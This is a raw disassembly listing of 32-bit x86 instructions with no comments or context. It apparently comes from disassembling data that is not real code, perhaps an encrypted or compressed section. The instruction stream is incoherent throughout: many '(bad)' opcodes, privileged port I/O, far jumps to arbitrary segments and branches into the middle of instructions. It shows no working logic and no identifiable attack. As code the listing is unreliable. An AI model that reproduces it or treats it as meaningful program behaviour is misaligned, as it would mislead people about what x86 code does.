  40371a:	cmp    DWORD PTR [edx+0x10519b5a],0xd2a209e2
  403724:	clc    
  403725:	out    dx,al
  403726:	lods   eax,DWORD PTR ds:[esi]
  403728:	mov    ch,0x3
  40372a:	enter  0x5633,0xb4
  40372e:	mov    al,ds:0xbc8793b5
  403733:	sbb    DWORD PTR [ebp-0x21],0xffffff85
  403737:	xchg   ebp,eax
  403738:	push   esi
  403739:	and    BYTE PTR [edi],al
  40373b:	push   eax
  40373c:	shr    BYTE PTR [eax-0x45d4b58b],1
  403742:	clc    
  403743:	daa    
  403744:	jp     0x40375c
  403746:	push   esi
  403747:	ds inc ebp
  403749:	fidiv  DWORD PTR [edx]
  40374b:	jg     0x40376d
  40374d:	test   eax,0x7eacaa0
  403752:	adc    ebx,DWORD PTR [eax+0x78]
  403755:	jnp    0x4037d5
  403757:	fmul   QWORD PTR [ecx]
  403759:	lock add DWORD PTR [ebp-0x5ae501d3],ecx
  403760:	mov    bl,0x3
  403762:	sub    BYTE PTR [ebx],dh
  403764:	cld    
  403765:	fsub   QWORD PTR [edx+0x48]
  403768:	retf   
  403769:	aam    0x6f
  40376b:	mov    ah,0x90
  40376d:	cli    
  40376e:	int3   
  40376f:	in     al,0x4b
  403771:	lods   eax,DWORD PTR ds:[esi]
  403772:	push   ds
  403773:	push   cs
  403774:	hlt    
  403775:	xor    BYTE PTR [edx+0x17],dl
  403778:	jl     0x4037bd
  40377a:	jmp    0x4037c7
  40377c:	jnp    0x40376d
  40377e:	push   edx
  40377f:	ret    0x75a7
  403782:	sub    eax,esi
  403784:	add    eax,ecx
  403786:	aam    0x65
  403788:	add    al,0x1d
  40378a:	int3   
  40378b:	mov    bl,BYTE PTR ss:[edi-0x8]
  40378f:	enter  0x6ae6,0x42
  403793:	inc    ebp
  403794:	pop    esi
  403795:	in     al,dx
  403796:	and    BYTE PTR [ecx+0x72],ah
  403799:	mov    ds:0x2144aa8a,al
  40379e:	cmp    ah,BYTE PTR [edx-0x7a]
  4037a1:	fild   DWORD PTR [edi-0x39]
  4037a4:	adc    eax,0xde58af5
  4037a9:	mov    cl,0xb5
  4037ab:	mov    bl,0x77
  4037ad:	into   
  4037ae:	and    dl,dh
  4037b0:	adc    DWORD PTR [edi],ecx
  4037b2:	lods   eax,DWORD PTR ds:[esi]
  4037b3:	push   0x5ba877e2
  4037b8:	cmp    eax,0xa1b7e09a
  4037bd:	adc    BYTE PTR [esi],dl
  4037bf:	mov    bh,0x1d
  4037c1:	push   eax
  4037c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037c3:	mov    ds:0xa1333bbe,eax
  4037c8:	sub    DWORD PTR [edx-0x31],ecx
  4037cb:	mov    ch,BYTE PTR [esi-0x12]
  4037ce:	add    esp,DWORD PTR [edi]
  4037d0:	rol    DWORD PTR [edi+0x220c75f4],0xe3
  4037d7:	adc    eax,0x27e4a081
  4037dc:	jmp    0xc963d006
  4037e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037e2:	aad    0xe9
  4037e4:	out    dx,al
  4037e5:	inc    edi
  4037e6:	aas    
  4037e7:	xor    eax,DWORD PTR [eax]
  4037e9:	iret   
  4037ea:	in     al,0x12
  4037ec:	pop    ss
  4037ed:	push   es
  4037ee:	xor    BYTE PTR [ecx+0x1e],bl
  4037f1:	(bad)  
  4037f3:	jmp    0x403843
  4037f5:	push   ebp
  4037f6:	adc    esp,DWORD PTR [edi]
  4037f8:	fistp  WORD PTR ds:0xd05f6de4
  4037fe:	lea    esp,ds:0xcbb9b796
  403804:	mov    al,ds:0x2701d645
  403809:	cmp    ebp,DWORD PTR [ebx+0x28]
  40380c:	in     al,0x1d
  40380e:	shr    BYTE PTR [ecx],0x4f
  403811:	add    dl,BYTE PTR [edx+0x61a47487]
  403817:	dec    edi
  403818:	or     ebx,esp
  40381a:	mov    bl,0x2d
  40381c:	rol    ebp,cl
  40381e:	add    dh,BYTE PTR [esi-0x4d]
  403821:	cdq    
  403822:	jbe    0x4037a6
  403824:	sbb    eax,0x8ee37da2
  403829:	test   al,0x53
  40382b:	aas    
  40382c:	xchg   dh,dl
  40382e:	and    ebp,edx
  403830:	stos   DWORD PTR es:[edi],eax
  403831:	test   edx,eax
  403833:	fld    QWORD PTR [esi+eax*1-0x6f]
  403837:	jno    0x403882
  403839:	std    
  40383a:	out    dx,al
  40383b:	sbb    al,0xc9
  40383d:	jne    0x40385c
  40383f:	mov    al,ds:0xcd0aac20
  403844:	xor    ebx,ecx
  403846:	mov    cl,0x10
  403848:	jae    0x403804
  40384a:	dec    edi
  40384b:	jmp    0xa3fc3e03
  403850:	push   ss
  403851:	dec    edx
  403852:	cmp    DWORD PTR [edx+esi*8],eax
  403855:	pop    ds
  403856:	xchg   esp,eax
  403857:	push   ebx
  403858:	jns    0x4038c1
  40385a:	shl    BYTE PTR [esi+edi*2+0xf049acb],1
  403861:	es push esi
  403863:	rol    edi,0x21
  403866:	div    BYTE PTR [ebx-0x73d0cb32]
  40386c:	jmp    0xb959:0xf2e1
  403872:	in     al,dx
  403873:	mov    edx,0xd334b69f
  403878:	sbb    esp,DWORD PTR [ecx]
  40387a:	mov    ebx,?
  40387c:	add    DWORD PTR [ebp+0x6e77973],ecx
  403882:	jmp    0x4e06:0x188cbbcd
  403889:	hlt    
  40388a:	nop
  40388b:	or     bl,BYTE PTR [edi]
  40388d:	mov    bl,0x42
  40388f:	mov    ebp,0xf76928b6
  403894:	cmp    BYTE PTR [edx-0x44da5673],dl
  40389a:	(bad)  
  40389b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40389c:	jo     0x4038cd
  40389e:	or     BYTE PTR [ecx],bl
  4038a0:	inc    eax
  4038a1:	retf   
  4038a2:	mov    al,0x11
  4038a4:	mov    ebx,0x8103a12d
  4038a9:	call   0xeb1f:0xad80ffc5
  4038b0:	push   eax
  4038b1:	dec    ebp
  4038b2:	and    eax,0xf224243c
  4038b7:	cwde   
  4038b8:	xchg   esi,eax
  4038b9:	retf   0x847e
  4038bc:	push   edi
  4038bd:	gs (bad) 
  4038bf:	leave  
  4038c0:	popa   
  4038c1:	lods   eax,DWORD PTR ds:[esi]
  4038c2:	jl     0x403880
  4038c4:	adc    al,0x71
  4038c6:	and    DWORD PTR [edi+0x2f0cc483],ebx
  4038cc:	int    0x2e
  4038ce:	(bad)  
  4038cf:	jl     0x4038f6
  4038d1:	imul   eax,edi,0x62d65947
  4038d7:	in     eax,dx
  4038d8:	fist   WORD PTR [edi]
  4038da:	or     dh,BYTE PTR [eax+0x668b2f02]
  4038e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038e1:	inc    ecx
  4038e2:	ja     0x4038ed
  4038e4:	(bad)  
  4038e5:	cmc    
  4038e6:	add    BYTE PTR [eax+edx*8-0x4677877c],dl
  4038ed:	mov    BYTE PTR [edx+0x4b9456ea],cl
  4038f3:	inc    ecx
  4038f4:	mov    DWORD PTR [esi-0x14d44ae0],ecx
  4038fa:	jp     0x40391a
  4038fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038fd:	and    al,0xc9
  4038ff:	lods   al,BYTE PTR ds:[esi]
  403900:	sub    dh,ah
  403902:	mov    ecx,0xffda17c0
  403907:	int    0x69
  403909:	mov    ds:0xa16cbd2c,al
  40390e:	and    al,0x3e
  403910:	(bad)  
  403911:	rcr    BYTE PTR [edx],0x17
  403914:	jp     0x40390c
  403916:	int3   
  403917:	dec    ecx
  403918:	xlat   BYTE PTR ds:[ebx]
  403919:	mov    ebx,0x631a17b1
  40391e:	and    ah,BYTE PTR [eax]
  403920:	call   0x1f15:0x7e3fc2fb
  403927:	jae    0x403944
  403929:	(bad)  
  40392a:	cld    
  40392b:	(bad)  
  40392c:	xor    DWORD PTR [ebp-0x49f6e3d6],ebp
  403932:	mov    WORD PTR [esi+0x13],ss
  403935:	adc    DWORD PTR ds:0xbf18cde9,0x57
  40393c:	and    BYTE PTR [ecx-0x5434a66a],0xfc
  403943:	xchg   ecx,eax
  403944:	call   0x5557a345
  403949:	inc    edi
  40394a:	push   esi
  40394b:	mov    ah,0x3
  40394d:	fcom   DWORD PTR [eax]
  40394f:	and    ebp,ecx
  403951:	inc    eax
  403952:	pusha  
  403953:	and    eax,0xf333e787
  403958:	sahf   
  403959:	sahf   
  40395a:	adc    al,0x56
  40395c:	daa    
  40395d:	call   0xddc9:0x83f607ca
  403964:	sahf   
  403965:	jmp    0x403981
  403967:	add    ecx,DWORD PTR [ebp+0x4334b1ea]
  40396d:	xchg   BYTE PTR [ebp+0x56f03ad4],ah
  403973:	scas   eax,DWORD PTR es:[edi]
  403974:	or     ebx,DWORD PTR [ecx+0x33]
  403977:	or     ch,dh
  403979:	out    dx,al
  40397a:	inc    ebp
  40397b:	pop    esi
  40397c:	dec    edi
  40397d:	jp     0x4038ff
  40397f:	add    BYTE PTR [ecx],dl
  403981:	ret    0x1815
  403984:	xor    BYTE PTR [ebx*2+0x60fa3565],dh
  40398b:	(bad)  
  40398c:	loopne 0x4039c9
  40398e:	inc    esp
  40398f:	leave  
  403990:	add    eax,0xfaccf521
  403995:	int3   
  403996:	loop   0x40397c
  403998:	fbstp  TBYTE PTR [eax-0xf]
  40399b:	mov    dh,0xae
  40399d:	(bad)  
  40399e:	gs mov ebp,0x30562f73
  4039a4:	cmp    eax,0xf44db11c
  4039a9:	mov    bl,0x3a
  4039ab:	jmp    0xaf63c416
  4039b0:	dec    eax
  4039b1:	mov    WORD PTR [ecx],cs
  4039b3:	or     DWORD PTR [edx-0x16],edi
  4039b6:	jp     0x4039fb
  4039b8:	aam    0x33
  4039ba:	push   ebx
  4039bb:	rcl    dl,1
  4039bd:	push   ebx
  4039be:	mov    dl,0xee
  4039c0:	les    esi,FWORD PTR [esi+0x4c]
  4039c3:	loop   0x403990
  4039c5:	inc    esi
  4039c6:	jmp    0x4039f0
  4039c8:	clc    
  4039c9:	retf   
  4039ca:	push   ss
  4039cb:	hlt    
  4039cc:	add    ebp,ebp
  4039ce:	in     al,0x1b
  4039d0:	mov    bh,0xb8
  4039d2:	xchg   ecx,eax
  4039d3:	push   edx
  4039d4:	aaa    
  4039d5:	sub    al,BYTE PTR [ebp-0x72]
  4039d8:	(bad)  
  4039d9:	lock cmp eax,0xfba8125e
  4039df:	cld    
  4039e0:	xor    al,0xee
  4039e2:	call   0xee08:0x953a80e0
  4039e9:	push   edi
  4039ea:	sbb    ecx,DWORD PTR [ecx+0x33b26354]
  4039f0:	in     eax,dx
  4039f1:	mov    esi,0xf1a4680
  4039f6:	mov    DWORD PTR [ecx+esi*8-0x29147860],ecx
  4039fd:	cld    
  4039fe:	xor    al,bh
  403a00:	aad    0x0
  403a02:	cli    
  403a03:	adc    al,0x6b
  403a05:	cmp    al,0xee
  403a07:	inc    esp
  403a08:	(bad)  
  403a0b:	inc    esp
  403a0c:	jae    0x4039a9
  403a0e:	adc    BYTE PTR [edi+0x5c],bl
  403a11:	xor    eax,0x8b4447ed
  403a16:	cmc    
  403a17:	call   0xd071:0x4aa1d3a8
  403a1e:	push   esp
  403a1f:	(bad)  
  403a20:	nop
  403a21:	push   eax
  403a22:	push   esp
  403a23:	add    eax,0xcad20e6
  403a28:	out    0x27,eax
  403a2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a2b:	addr16 retf 0x703f
  403a2f:	fcomp  QWORD PTR [esi+0x2d]
  403a32:	jns    0x4039dd
  403a34:	test   BYTE PTR [edi+0x13],cl
  403a37:	push   0xc9b628d1
  403a3c:	adc    BYTE PTR [edx],cl
  403a3e:	loope  0x403aae
  403a40:	into   
  403a41:	xchg   ecx,eax
  403a42:	xlat   BYTE PTR ds:[ebx]
  403a43:	ja     0x403a4b
  403a45:	cmp    BYTE PTR ds:0x1247b0a0,cl
  403a4b:	sahf   
  403a4c:	add    dh,cl
  403a4e:	and    eax,0x97de1427
  403a53:	call   0xaffddd63
  403a58:	xchg   esp,eax
  403a59:	(bad)  
  403a5a:	daa    
  403a5b:	es out dx,al
  403a5d:	repz call 0xc532:0xabe4514a
  403a65:	or     esi,DWORD PTR ds:0x44b427f7
  403a6b:	jg     0x403a12
  403a6d:	retf   
  403a6e:	add    BYTE PTR [ebp+0x46],0x57
  403a72:	ror    BYTE PTR [esi],0xd0
  403a75:	and    eax,0xb6b6612b
  403a7a:	les    ecx,FWORD PTR [eax]
  403a7c:	test   DWORD PTR es:[ebx],edi
  403a7f:	jecxz  0x403a7b
  403a81:	add    eax,DWORD PTR ds:0x5eedecf2
  403a87:	iret   
  403a88:	jns    0x403a4c
  403a8a:	js     0x403ad9
  403a8c:	xchg   esp,eax
  403a8d:	hlt    
  403a8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a8f:	pop    ss
  403a90:	es jge 0x403ab0
  403a93:	(bad)  
  403a94:	outs   dx,BYTE PTR ds:[esi]
  403a95:	pop    edi
  403a96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a97:	aam    0x38
  403a99:	popa   
  403a9a:	dec    ecx
  403a9b:	rcl    DWORD PTR [edi-0x62d43ca9],0x79
  403aa2:	mov    al,0x69
  403aa4:	leave  
  403aa5:	out    0x46,eax
  403aa7:	repz jp 0x403a7c
  403aaa:	ss leave 
  403aac:	cs inc edi
  403aae:	fs mov eax,0x4f106f23
  403ab4:	scas   eax,DWORD PTR es:[edi]
  403ab5:	pop    ecx
  403ab6:	xlat   BYTE PTR ds:[ebx]
  403ab7:	xchg   esp,eax
  403ab8:	mov    eax,ds:0x37d458a
  403abd:	ds scas eax,DWORD PTR es:[edi]
  403abf:	mov    dh,0xf7
  403ac1:	add    esi,esp
  403ac3:	(bad)  
  403ac5:	sbb    al,0x97
  403ac7:	push   edx
  403ac8:	jbe    0x403acd
  403aca:	rol    BYTE PTR [edx],cl
  403acc:	test   esp,ebp
  403ace:	lahf   
  403acf:	xor    eax,0x9c959da6
  403ad4:	aam    0x12
  403ad6:	rcr    DWORD PTR [ebx-0x13],cl
  403ad9:	imul   edx,DWORD PTR [eax-0x41],0x7ca4f5aa
  403ae0:	loope  0x403a63
  403ae2:	add    al,0x28
  403ae4:	fs int 0x30
  403ae7:	add    esp,DWORD PTR [ebp-0x5a]
  403aea:	adc    dx,sp
  403aed:	jmp    0x403af1
  403aef:	sti    
  403af0:	cli    
  403af1:	dec    eax
  403af2:	xchg   edi,eax
  403af3:	repnz mov ds:0xe7a75c6,eax
  403af9:	call   0x2a373b90
  403afe:	xor    al,0x62
  403b00:	lea    ecx,[esi+0x716c7789]
  403b06:	jo     0x403a96
  403b08:	inc    esp
  403b09:	pop    ss
  403b0a:	push   ecx
  403b0b:	dec    ecx
  403b0c:	lods   eax,DWORD PTR ds:[esi]
  403b0d:	call   0x5b73d35a
  403b12:	xor    al,0xd
  403b14:	pop    edi
  403b15:	(bad)  [ecx+0x79]
  403b18:	mov    ss,WORD PTR [ebp-0x54f0cb19]
  403b1e:	xchg   edi,eax
  403b1f:	inc    eax
  403b20:	in     eax,0xc7
  403b22:	xchg   esi,eax
  403b23:	fsubr  DWORD PTR [edx-0x3aba5115]
  403b29:	pushf  
  403b2a:	jnp    0x403ab0
  403b2c:	sub    edx,DWORD PTR [esi]
  403b2e:	in     eax,0x11
  403b30:	dec    edi
  403b31:	ja     0x403ac9
  403b33:	pushf  
  403b34:	sbb    eax,0xb47b6210
  403b39:	jbe    0x403b8d
  403b3b:	ss jge 0x403b22
  403b3e:	retf   
  403b3f:	adc    BYTE PTR [ebp-0x7e],bh
  403b42:	xchg   edi,eax
  403b43:	retf   0x6f76
  403b46:	xor    eax,0xf71a621c
  403b4b:	in     eax,dx
  403b4c:	stos   DWORD PTR es:[edi],eax
  403b4d:	je     0x403aeb
  403b4f:	int3   
  403b50:	mov    ah,0xfa
  403b52:	sar    BYTE PTR [ebx-0x7c29f8fd],1
  403b58:	adc    dl,bl
  403b5a:	dec    edx
  403b5b:	or     ebx,esp
  403b5d:	push   eax
  403b5e:	imul   edi,DWORD PTR [ebp+0xc],0xcf62a138
  403b65:	int3   
  403b66:	loope  0x403b0a
  403b68:	cs scas al,BYTE PTR es:[edi]
  403b6a:	das    
  403b6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b6c:	jle    0x403bd9
  403b6e:	xor    ah,dh
  403b70:	push   es
  403b71:	jns    0x403b70
  403b73:	dec    ecx
  403b74:	neg    BYTE PTR [edx-0x3ecf9449]
  403b7a:	cli    
  403b7b:	test   al,0xa4
  403b7d:	push   edi
  403b7e:	xlat   BYTE PTR ds:[ebx]
  403b7f:	and    BYTE PTR [ecx-0x31],ah
  403b82:	fild   DWORD PTR [edi+0x8]
  403b85:	sub    ebx,edi
  403b87:	adc    ebp,DWORD PTR [edi-0xb]
  403b8a:	call   0x1df6502a
  403b8f:	(bad)  
  403b90:	pop    ss
  403b91:	sub    al,0x52
  403b93:	popf   
  403b94:	pop    esi
  403b95:	adc    eax,DWORD PTR [esi+0x1a]
  403b98:	out    0x73,al
  403b9a:	adc    bl,BYTE PTR [ebx-0x11]
  403b9d:	xchg   edi,eax
  403b9e:	mov    dl,0x63
  403ba0:	cmp    eax,0xb7ae8ff4
  403ba5:	or     al,0x1
  403ba7:	cmp    BYTE PTR [ecx],dl
  403ba9:	lahf   
  403baa:	scas   eax,DWORD PTR es:[edi]
  403bab:	(bad)  
  403bac:	jns    0x403b8e
  403bae:	xor    DWORD PTR [ecx+0x4b],ecx
  403bb1:	dec    esi
  403bb2:	pusha  
  403bb3:	jmp    0x403ba4
  403bb5:	ds mov al,0x3d
  403bb8:	es fcmovnbe st,st(5)
  403bbb:	sub    eax,0xfd090915
  403bc0:	push   cs
  403bc1:	adc    DWORD PTR [ebp-0x2a808be2],eax
  403bc7:	enter  0x19e2,0xb5
  403bcb:	mov    ch,0x17
  403bcd:	jl     0x403bb5
  403bcf:	in     al,0xb3
  403bd1:	and    al,0xb2
  403bd3:	hlt    
  403bd4:	test   al,0xa5
  403bd6:	dec    edi
  403bd7:	add    eax,0x41b58897
  403bdc:	adc    bh,ah
  403bde:	shl    DWORD PTR [ebx+0x6548569a],cl
  403be4:	aad    0x1d
  403be6:	mov    bh,0x76
  403be8:	sbb    BYTE PTR [eax+0x61],cl
  403beb:	in     eax,dx
  403bec:	add    BYTE PTR [edi+0x56],al
  403bef:	test   BYTE PTR [edi-0x6879be26],ch
  403bf5:	pop    ebp
  403bf6:	sub    ebp,edi
  403bf8:	cmc    
  403bf9:	mov    esp,DWORD PTR [ebx-0x215440cf]
  403bff:	mov    ebx,0x7c2cd229
  403c04:	ss cdq 
  403c06:	fidiv  WORD PTR [ebx+edx*4+0x26f96b41]
  403c0d:	pusha  
  403c0e:	mov    ecx,0xa6708e35
  403c13:	jae    0x403c5a
  403c15:	mov    edx,0x11b50a74
  403c1a:	loopne 0x403ba5
  403c1c:	mov    ecx,0xed1c7181
  403c21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c22:	(bad)  
  403c23:	and    al,ah
  403c25:	test   BYTE PTR [edx+ecx*2+0x55],0xe8
  403c2a:	pop    edx
  403c2b:	shr    BYTE PTR [ebp+0x37],1
  403c2e:	or     DWORD PTR [eax],edi
  403c30:	fucomip st,st(6)
  403c32:	sub    edi,DWORD PTR [esi]
  403c34:	stos   DWORD PTR es:[edi],eax
  403c35:	xchg   edx,eax
  403c36:	sub    eax,0xd8bebfe7
  403c3b:	cmp    esi,DWORD PTR es:[ebx+0x704f60ce]
  403c42:	lock mov cl,0x51
  403c45:	test   al,0xd9
  403c47:	lods   al,BYTE PTR ds:[esi]
  403c48:	push   edx
  403c49:	mov    ebp,0xc3513be8
  403c4e:	xor    BYTE PTR [ebp+0xd],ch
  403c51:	and    cl,BYTE PTR [eax+edx*4-0x1a]
  403c55:	xchg   edi,eax
  403c56:	dec    ebp
  403c57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c58:	outs   dx,BYTE PTR ds:[esi]
  403c59:	or     DWORD PTR [esi],eax
  403c5b:	mov    ch,0xa
  403c5d:	pop    es
  403c5e:	fcmove st,st(6)
  403c60:	xor    eax,0x2e0f43cd
  403c65:	adc    dh,BYTE PTR [ecx]
  403c67:	mov    edi,0xae0bbb3d
  403c6c:	fild   WORD PTR [eax+0x7059ce04]
  403c72:	imul   edi,DWORD PTR [ecx],0xd3c02b6b
  403c78:	imul   edx,eax,0x52115b13
  403c7e:	cmp    edi,ebp
  403c80:	xchg   edi,eax
  403c81:	clc    
  403c82:	shl    ebx,cl
  403c84:	gs cmp al,0x12
  403c87:	fnstcw WORD PTR [edx]
  403c89:	jne    0x403caa
  403c8b:	xchg   DWORD PTR [ecx-0x34],esp
  403c8e:	lahf   
  403c8f:	xor    ecx,ecx
  403c91:	dec    edx
  403c92:	xlat   BYTE PTR ds:[ebx]
  403c93:	fsub   DWORD PTR [edi]
  403c95:	pusha  
  403c96:	pop    edi
  403c97:	fiadd  DWORD PTR [ecx+0x5b]
  403c9a:	mov    al,ds:0x84af88f5
  403c9f:	push   edx
  403ca0:	cmc    
  403ca1:	push   ds
  403ca2:	dec    esi
  403ca3:	iret   
  403ca4:	ins    DWORD PTR es:[edi],dx
  403ca5:	add    eax,0xe8716860
  403caa:	dec    ecx
  403cab:	in     al,dx
  403cac:	retf   
  403cad:	das    
  403cae:	adc    ebp,DWORD PTR [eax+0x6f5abb90]
  403cb4:	push   ebx
  403cb5:	loop   0x403d2d
  403cb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cb8:	push   edi
  403cb9:	mov    eax,ds:0x5c87b795
  403cbe:	add    al,0x88
  403cc0:	or     DWORD PTR [ebp-0x7b],0x7623da70
  403cc7:	jmp    0xb3e980ca
  403ccc:	sar    ah,cl
  403cce:	loop   0x403cc5
  403cd0:	(bad)  
  403cd1:	cmp    al,0x89
  403cd3:	js     0x403d35
  403cd5:	retf   
  403cd6:	push   ds
  403cd7:	fdivr  st(2),st
  403cd9:	daa    
  403cda:	pusha  
  403cdb:	inc    ebp
  403cdc:	xchg   edx,eax
  403cdd:	pop    ebp
  403cde:	(bad)  
  403cdf:	sbb    al,0xe1
  403ce1:	in     al,dx
  403ce2:	sar    BYTE PTR [esi+0x17],cl
  403ce5:	(bad)  
  403ce6:	imul   edx,DWORD PTR ds:0x661e353c,0xffffff92
  403ced:	add    BYTE PTR [ecx-0x5c],dl
  403cf0:	sub    DWORD PTR [edx+ebx*1-0x58],ebx
  403cf4:	hlt    
  403cf5:	in     eax,dx
  403cf6:	mov    ch,0x96
  403cf8:	and    eax,0x82fb8d3c
  403cfd:	mov    ds:0x8da5a06b,al
  403d02:	pop    ds
  403d03:	jno    0x403d05
  403d05:	sub    dl,BYTE PTR [edx-0x5d]
  403d08:	dec    edi
  403d09:	pop    ebp
  403d0a:	dec    esp
  403d0b:	rol    DWORD PTR [ebp+0x47],1
  403d0e:	mov    bl,0x97
  403d10:	and    DWORD PTR [eax],0xffffffaa
  403d13:	shl    DWORD PTR [edi],0x6d
  403d16:	nop
  403d17:	jmp    0xe08:0x9a362edb
  403d1e:	aad    0xec
  403d20:	jbe    0x403d94
  403d22:	cs scas al,BYTE PTR es:[edi]
  403d24:	mov    ch,0x5d
  403d26:	ins    BYTE PTR es:[edi],dx
  403d27:	in     al,dx
  403d28:	push   ebx
  403d29:	call   0x4ac85bcd
  403d2e:	jp     0x403d56
  403d30:	fisubr WORD PTR [ebx]
  403d32:	ja     0x403cce
  403d34:	repnz das 
  403d36:	inc    edx
  403d37:	xchg   esi,eax
  403d38:	push   ss
  403d39:	repz out 0x77,eax
  403d3c:	pop    ss
  403d3d:	xrelease mov DWORD PTR [esi+0x36d82ab7],ecx
  403d44:	mov    ebp,0x55669d11
  403d49:	cwde   
  403d4a:	ret    
  403d4b:	sbb    DWORD PTR ds:0xabe7ba39,eax
  403d51:	adc    ecx,DWORD PTR [edi-0x6f6155c]
  403d57:	and    al,0x91
  403d59:	cmp    eax,0x34ef1904
  403d5e:	or     ebp,DWORD PTR [ecx+0x6c]
  403d61:	das    
  403d62:	imul   ebx,DWORD PTR [eax-0x1],0xca91f2be
  403d69:	and    BYTE PTR [ebx+ebx*2],bl
  403d6c:	cmp    edi,ebx
  403d6e:	xchg   BYTE PTR [edi+esi*4+0x17],ch
  403d72:	adc    bl,bl
  403d74:	fs enter 0x5b82,0xfe
  403d79:	adc    dl,BYTE PTR [ebx]
  403d7b:	hlt    
  403d7c:	mov    dh,0x3a
  403d7e:	ror    cl,0xce
  403d81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d82:	sub    eax,0x25a80909
  403d87:	inc    esp
  403d88:	je     0x403da9
  403d8a:	bound  edi,QWORD PTR [edi+0x6b67268f]
  403d90:	lea    ebp,[ebp+0x47]
  403d93:	jmp    0x7369:0x8926537b
  403d9a:	jg     0x403d55
  403d9c:	pop    ds
  403d9d:	push   esp
  403d9e:	rcr    BYTE PTR fs:[esi+0x2e],cl
  403da2:	out    dx,al
  403da3:	sbb    BYTE PTR [edx],cl
  403da5:	jl     0x403dee
  403da7:	cmc    
  403da8:	mov    ebp,0xdebaa500
  403dad:	fs out dx,al
  403daf:	add    BYTE PTR [ebx+esi*2-0x48],dh
  403db3:	and    bh,BYTE PTR [ebx]
  403db5:	stc    
  403db6:	jecxz  0x403dcc
  403db8:	fisttp WORD PTR [eax+0x9]
  403dbb:	retf   0x7922
  403dbe:	jl     0x403e08
  403dc0:	dec    ecx
  403dc1:	cdq    
  403dc2:	(bad)  
  403dc3:	fisubr DWORD PTR [ecx-0x50]
  403dc6:	dec    ebx
  403dc7:	cmc    
  403dc8:	adc    ebp,edx
  403dca:	(bad)  
  403dcb:	popf   
  403dcc:	mul    ch
  403dce:	sub    esi,esp
  403dd0:	dec    edx
  403dd1:	push   0xffffffc1
  403dd3:	xor    al,0xbc
  403dd5:	rcr    bh,0x60
  403dd8:	adc    BYTE PTR [edx],0x4f
  403ddb:	xchg   ebp,eax
  403ddc:	jne    0x403dbf
  403dde:	push   ecx
  403ddf:	jmp    0x2e9242af
  403de4:	xor    BYTE PTR [edx+0x4e],bh
  403de7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403de8:	or     eax,0x5a956a27
  403ded:	or     DWORD PTR [esi-0x4a30eb6c],0xca2498fd
  403df7:	out    dx,eax
  403df8:	sar    DWORD PTR [ebx-0x750efe15],1
  403dfe:	scas   al,BYTE PTR es:[edi]
  403dff:	lods   eax,DWORD PTR ds:[esi]
  403e00:	push   0x2d2f255a
  403e05:	sub    ecx,esi
  403e07:	addr16 pop eax
  403e09:	lods   eax,DWORD PTR ds:[esi]
  403e0a:	jg     0x403e70
  403e0c:	inc    esi
  403e0d:	test   BYTE PTR [ebp+0x65a4edd7],bh
  403e13:	stos   BYTE PTR es:[edi],al
  403e14:	mov    ds:0x8d96d4d,al
  403e19:	mov    cl,0x6d
  403e1b:	sahf   
  403e1c:	inc    ecx
  403e1d:	ins    DWORD PTR es:[edi],dx
  403e1e:	and    DWORD PTR [ecx],edi
  403e20:	hlt    
  403e21:	mov    edx,0xed4646e8
  403e26:	push   0xd98a58f4
  403e2b:	mov    BYTE PTR [edx-0x1c],bh
  403e2e:	das    
  403e2f:	mov    bl,BYTE PTR [edx]
  403e31:	neg    DWORD PTR [ebp+0x4f]
  403e34:	lock outs dx,BYTE PTR ds:[esi]
  403e36:	test   ah,ch
  403e38:	aam    0x33
  403e3a:	xchg   edi,eax
  403e3b:	daa    
  403e3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e3d:	xchg   ebp,eax
  403e3e:	fdivr  st,st(2)
  403e40:	test   cl,cl
  403e42:	dec    ecx
  403e43:	js     0x403e8c
  403e45:	lea    edx,[eax-0x7d547d5c]
  403e4b:	leave  
  403e4c:	and    al,0x1e
  403e4e:	inc    edx
  403e4f:	cs jge 0x403e3b
  403e52:	ret    0x5c3a
  403e55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e56:	out    dx,al
  403e57:	push   0x64
  403e59:	or     ah,bl
  403e5b:	mov    edx,cs
  403e5d:	add    al,0xa3
  403e5f:	xchg   ah,cl
  403e61:	push   ds
  403e62:	enter  0x9ae9,0xfb
  403e66:	push   eax
  403e67:	and    ebx,DWORD PTR [ebx]
  403e69:	sti    
  403e6a:	or     eax,0xe893363c
  403e6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e70:	xchg   esi,eax
  403e71:	iret   
  403e72:	lock shr BYTE PTR [eax-0x597179e4],cl
  403e79:	pop    es
  403e7a:	ins    DWORD PTR es:[edi],dx
  403e7b:	test   DWORD PTR [ecx+eax*8-0x16d9477c],0x5c0cccba
  403e86:	mov    esi,0xac1b3c83
  403e8b:	or     cl,cl
  403e8d:	push   ecx
  403e8e:	jb     0x403e73
  403e90:	sti    
  403e91:	loope  0x403e6e
  403e93:	sbb    BYTE PTR [ebp-0x4d],al
  403e96:	les    ecx,FWORD PTR [ebp+0x2]
  403e99:	int3   
  403e9a:	inc    esp
  403e9b:	aas    
  403e9c:	or     DWORD PTR [ecx],ecx
  403e9e:	sbb    esi,DWORD PTR [edx-0x5ce0fd3]
  403ea4:	fisttp DWORD PTR [ecx+0x13d1d43a]
  403eaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403eab:	jl     0x403f1c
  403ead:	mov    edi,0xefb231b2
  403eb2:	dec    ebp
  403eb3:	jb     0x403ef0
  403eb5:	cmp    DWORD PTR [esi+0xd035f59],edi
  403ebb:	mov    WORD PTR es:[esi*2+0x4a9a41a6],fs
  403ec3:	popf   
  403ec4:	jno    0x403e94
